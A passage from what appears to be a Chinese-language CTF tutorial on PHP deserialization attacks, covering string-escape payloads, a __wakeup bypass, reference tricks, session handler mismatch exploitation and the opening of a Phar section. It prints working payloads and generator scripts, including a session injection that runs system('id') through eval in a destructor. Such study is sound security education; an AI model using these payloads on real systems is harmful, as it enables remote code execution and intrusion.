class="string">&quot;;s:8:&quot;</span>passdata<span class="string">&quot;;s:3:&quot;</span>vip<span class="string">&quot;;b:1;&#125;</span></span><br></pre></td></tr></table></figure><p>这些数据完全可以放入到pass中，但是因为长度问题我们需要把pass变量的名字给吃掉，按照当前的数据为例，因为vip无法控制我们拿到的序列化数据如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:<span class="number">4</span>:<span class="string">&quot;test&quot;</span>:<span class="number">3</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;user&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;userdata&quot;</span>;s:<span class="number">4</span>:<span class="string">&quot;pass&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;passdata&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;vip&quot;</span>;b:<span class="number">0</span>;&#125;</span><br></pre></td></tr></table></figure><p>我们需要替换的内容，那具体总结出下图<br><img src="https://image.boychai.xyz/article/Pasted%20image%2020250620154949.png"><br>吃掉的这部分数据我们因该如何构建才会被吃掉？这里就需要利用<code>filter</code>这个过滤方法，我们需要吃掉的部分是</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;;s:4:&quot;</span>pass<span class="string">&quot;;s:8:&quot;</span></span><br></pre></td></tr></table></figure><p>他的长度是18，但我们需要注意的是，我们的pass最终肯定是一个长度大于10的，所以长度需要多算1位，当前是18，我们实际需要算19个，使用flag的话是双数的，算20个，<code>20/2=10</code>我们构造一个吃10个的param，然后在实际的数据中多加入一位，让其吃掉刚好就是20个，那么payload如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">param = flagflagflagflagflagflagflagflagflagflag</span><br><span class="line">pass = <span class="number">1</span><span class="string">&quot;;s:4:&quot;</span>pass<span class="string">&quot;;s:8:&quot;</span>passdata<span class="string">&quot;;s:3:&quot;</span>vip<span class="string">&quot;;b:1;&#125;</span></span><br></pre></td></tr></table></figure><p><img src="https://image.boychai.xyz/article/Pasted%20image%2020250620160835.png"></p><h1 id="其他技巧"><a href="#其他技巧" class="headerlink" title="其他技巧"></a>其他技巧</h1><h2 id="weakup绕过"><a href="#weakup绕过" class="headerlink" title="weakup绕过"></a>weakup绕过</h2><p>看一道例题，代码如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">secret</span></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$file</span>=<span class="string">&#x27;index.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;file=<span class="variable">$file</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">include_once</span>(<span class="variable language_">$this</span>-&gt;file);</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;file=<span class="string">&#x27;index.php&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$cmd</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$cmd</span>))&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[oc]:\d+:/i&#x27;</span>,<span class="variable">$cmd</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Are you daydreaming?&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">unserialize</span>(<span class="variable">$cmd</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//sercet in flag.php</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>首先是我们不能触发wakeup，参考<code>CVE-2016-7124</code>，主要是把成员变量多加一个即可，本身他就一个成员变量，咱们给他加一个即可，然后关于正则，这个正则的意思是<code>O:</code>不能追加数字，如果是数字那么就会触发，这里用一个<code>+</code>来做拼接，需要url编码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">secret</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$file</span> = <span class="string">&#x27;index.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;file = <span class="variable">$file</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title function_ invoke__">secret</span>(<span class="string">&#x27;flag.php&#x27;</span>));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="string">&#x27;O:+6:&quot;secret&quot;:2:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125;&#x27;</span>)</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>PS：这个是有版本要求的</p><h2 id="引用对比"><a href="#引用对比" class="headerlink" title="引用对比"></a>引用对比</h2><p>看一个例题</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">just4fun</span> </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$enter</span>;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$secret</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;pass&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$pass</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;pass&#x27;</span>];</span><br><span class="line">    <span class="variable">$pass</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;*&#x27;</span>,<span class="string">&#x27;\*&#x27;</span>,<span class="variable">$pass</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$o</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$pass</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$o</span>) &#123;</span><br><span class="line">    <span class="variable">$o</span>-&gt;secret = <span class="string">&quot;*&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$o</span>-&gt;secret === <span class="variable">$o</span>-&gt;enter)</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Congratulation! Here is my secret: &quot;</span>.<span class="variable">$flag</span>;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Oh no... You can&#x27;t fool me&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">echo</span> <span class="string">&quot;are you trolling?&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>这道题目的问题在于enter不允许只输入<code>*</code>它会被替换掉，然后secret又在对比的时候肯定等于<code>*</code>，这里我们可以使用引用的方式去做，类似于C的指针，具体的解题方式如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">just4fun</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$enter</span>;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$secret</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">just4fun</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;enter = &amp;<span class="variable">$a</span>-&gt;secret;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br></pre></td></tr></table></figure><p><img src="https://image.boychai.xyz/article/Pasted%20image%2020250621164532.png"></p><h1 id="Session反序列化漏洞"><a href="#Session反序列化漏洞" class="headerlink" title="Session反序列化漏洞"></a>Session反序列化漏洞</h1><h2 id="关于session"><a href="#关于session" class="headerlink" title="关于session"></a>关于session</h2><p>当<code>session_start()</code>被调用或者php.ini中session.auto_start为1的时候，php内部会调用会话管理器，访问用户的部分数据被序列化后会存储在指定目录，默认为网站根目录的tmp目录。存储数据的格式有很多种，常用的有三种下面会进行列举，然后漏洞的产生一般都是写入的格式和读取的格式不一致。</p><table><thead><tr><th>处理方式</th><th>对应处理格式</th></tr></thead><tbody><tr><td>php</td><td>键名+竖线+经过serialize()函数序列化处理的值</td></tr><tr><td>php_binar</td><td>键名的长度对应的ASCII字符+键名+经过serialize()函数樊旭蕾话处理的值</td></tr><tr><td>php_serialize</td><td>经过serialize()函数序列化处理的数组。</td></tr><tr><td>简单举例，代码如下</td><td></td></tr></tbody></table><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;benben&#x27;</span>] = <span class="variable">$_GET</span>[<span class="string">&#x27;ben&#x27;</span>];</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>当传入的数据是<code>asdf</code>的时候那么在网站根目录的<code>tmp</code>下的内容如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@<span class="number">726</span>be1c353d8:/<span class="keyword">var</span>/www/html/tmp<span class="comment"># cat sess_rg9jedp1io4ntt6slr510h9d36</span></span><br><span class="line">benben|s:<span class="number">4</span>:<span class="string">&quot;asdf&quot;</span>;</span><br></pre></td></tr></table></figure><p>再看一下<code>php_serialize</code>的形式，代码如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;session.serialize_handler&#x27;</span>,<span class="string">&#x27;php_serialize&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;benben&#x27;</span>] = <span class="variable">$_GET</span>[<span class="string">&#x27;ben&#x27;</span>];</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;b&#x27;</span>] = <span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>];</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>我输入的payload是<code>ben=ls&amp;b=lls</code>，那么在本地存储的数据长这样</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@<span class="number">726</span>be1c353d8:/<span class="keyword">var</span>/www/html/tmp<span class="comment"># cat sess_rg9jedp1io4ntt6slr510h9d36</span></span><br><span class="line">a:<span class="number">2</span>:&#123;s:<span class="number">6</span>:<span class="string">&quot;benben&quot;</span>;s:<span class="number">2</span>:<span class="string">&quot;ls&quot;</span>;s:<span class="number">1</span>:<span class="string">&quot;b&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;lls&quot;</span>;&#125;</span><br></pre></td></tr></table></figure><p>如果是php_binary的形式，可以用下面的代码测试</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;session.serialize_handler&#x27;</span>,<span class="string">&#x27;php_binary&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;benben&#x27;</span>] = <span class="variable">$_GET</span>[<span class="string">&#x27;ben&#x27;</span>];</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;b&#x27;</span>] = <span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>];</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>传入的值依旧是<code>ben=ls&amp;b=lls</code>，存储的内容如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@<span class="number">726</span>be1c353d8:/<span class="keyword">var</span>/www/html/tmp<span class="comment"># cat sess_rg9jedp1io4ntt6slr510h9d36</span></span><br><span class="line">benbens:<span class="number">2</span>:<span class="string">&quot;ls&quot;</span>;bs:<span class="number">3</span>:<span class="string">&quot;lls&quot;</span>;</span><br></pre></td></tr></table></figure><h2 id="利用原理"><a href="#利用原理" class="headerlink" title="利用原理"></a>利用原理</h2><p>简单来一个例子大家就可以知道漏洞的产生原理了，下面有两个页面，全都存储到同一个网站目录下，第一个是漏洞提交页</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;session.serialize_handler&#x27;</span>,<span class="string">&#x27;php_serialize&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;ben&#x27;</span>] = <span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>还有一个是漏洞验证页面</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;session.serialize_handler&#x27;</span>,<span class="string">&#x27;php&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">D</span></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;a);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>在漏洞验证页面有一个D类，可以把里面的a变量当作代码去执行，在session启动的时候他会去读取本地存储的session，因为session存储方式基本都是序列化之后的，所以这里会产生反序列化的操作，从而触发D，那我们应该如何去触发D的反序列化呢？<br>这里我们构造一个payload在漏洞提交页给打进去，具体payload如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">D</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$a</span> = <span class="string">&quot;system(&#x27;id&#x27;);&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title function_ invoke__">D</span>());</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>拿到下面内容</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:<span class="number">1</span>:<span class="string">&quot;D&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">1</span>:<span class="string">&quot;a&quot;</span>;s:<span class="number">13</span>:<span class="string">&quot;system(&#x27;id&#x27;);&quot;</span>;&#125;</span><br></pre></td></tr></table></figure><p>我们给前面加入一个<code>|</code>，也就是完整的payload会变成下面样子</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">|O:1:&quot;D&quot;:1:&#123;s:1:&quot;a&quot;;s:13:&quot;system(&#x27;id&#x27;);&quot;;&#125;</span><br></pre></td></tr></table></figure><p>被存储在session之后的数据就会长这样</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a:<span class="number">1</span>:&#123;s:<span class="number">3</span>:<span class="string">&quot;ben&quot;</span>;s:<span class="number">42</span>:<span class="string">&quot;|O:1:&quot;</span>D<span class="string">&quot;:1:&#123;s:1:&quot;</span>a<span class="string">&quot;;s:13:&quot;</span><span class="title function_ invoke__">system</span>(<span class="string">&#x27;id&#x27;</span>);<span class="string">&quot;;&#125;&quot;</span>;&#125;</span><br></pre></td></tr></table></figure><p>我们再次访问漏洞验证页就会直接发现<code>id</code>命令被执行了<br><img src="https://image.boychai.xyz/article/Pasted%20image%2020250623151528.png"><br>具体的原理就是说在php这部分去识别session的时候会把</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a:<span class="number">1</span>:&#123;s:<span class="number">3</span>:<span class="string">&quot;ben&quot;</span>;s:<span class="number">42</span>:<span class="string">&quot;|O:1:&quot;</span>D<span class="string">&quot;:1:&#123;s:1:&quot;</span>a<span class="string">&quot;;s:13:&quot;</span><span class="title function_ invoke__">system</span>(<span class="string">&#x27;id&#x27;</span>);<span class="string">&quot;;&#125;&quot;</span>;&#125;</span><br></pre></td></tr></table></figure><p><code>a:1:&#123;s:3:&quot;ben&quot;;s:42:&quot;</code>识别成名字，然后后面的数据会被直接反序列化，就导致直接触发了<code>D-&gt;__destruct</code>魔术方法。</p><h2 id="例题练习"><a href="#例题练习" class="headerlink" title="例题练习"></a>例题练习</h2><p>具体代码如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="comment">/*hint.php*/</span></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$her</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;her=<span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">rand</span>(<span class="number">1</span>, <span class="number">10000</span>));</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;name===<span class="variable language_">$this</span>-&gt;her)&#123;</span><br><span class="line">            <span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>其中hint.php的代码如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;session.serialize_handler&#x27;</span>, <span class="string">&#x27;php_serialize&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;a&#x27;</span>] = <span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>具体的绕过思路就是通过引用绕过，思路和原理基本上是一模一样，具体的payload生成代码如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$her</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">Flag</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;name = &amp;<span class="variable">$a</span>-&gt;her;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>之后输入的payloay需要前面加入一个<code>|</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">|O:<span class="number">4</span>:<span class="string">&quot;Flag&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;name&quot;</span>;N;s:<span class="number">3</span>:<span class="string">&quot;her&quot;</span>;R:<span class="number">2</span>;&#125;</span><br></pre></td></tr></table></figure><p>即可拿到flag<br><img src="https://image.boychai.xyz/article/Pasted%20image%2020250623152537.png"></p><h1 id="Phar反序列化漏洞"><a href="#Phar反序列化漏洞" class="headerlink" title="Phar反序列化漏洞"></a>Phar反序列化漏洞</h1><h2 id="关于Phar"><a href="#关于Phar" class="headerlink" title="关于Phar"></a>关于Phar</h2><p>phar可以理解为php的一种压缩包，也可以理解为java中的jar包，让后对于php5.3或者更高的版本，phar后缀文件默认开启支持可以直接使用他。他的结构如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">stub phar 文件头部，格式为xxx<span class="meta">&lt;?php</span> xxx;<span class="title function_ invoke__">__HALT_COMPILER</span>();<span class="meta">?&gt;</span></span><br><span class="line">manifest  压缩文件的属性信息，以序列化存储</span><br><span class="line">contents  压缩文件的内容</span><br><span class="line">signature 前面，放在文件末尾</span><br></pre></td></tr></table></figure><p>phar协议解析的时候会自动触发对<code>manifest</code>字段的序列化字符串进行反序列化。然后可以自动直接识别phar文件的函数如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fileatime、filectime、file_exists、file_get_contents、file_put_contents、file、filegroup、fopen、fileinode、filemtime、fileowner、fileperms、is_dir、is_executable、is_file、is_link、is_readable、is_writable、is_writeable、parse_ini_file、copy、unlink、stat、readfile</span><br></pre></td></tr></table></figure><h2 id="利用原理-1"><a href="#利用原理-1" class="headerlink" title="利用原理"></a>利用原理</h2><p>利用原理就是在加载phar的时候必定会进行反序列化的操作，具体就是反序列化的位置就是phar的<code>manifest</code>部分，下面给一个通用的poc脚本，代码如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span 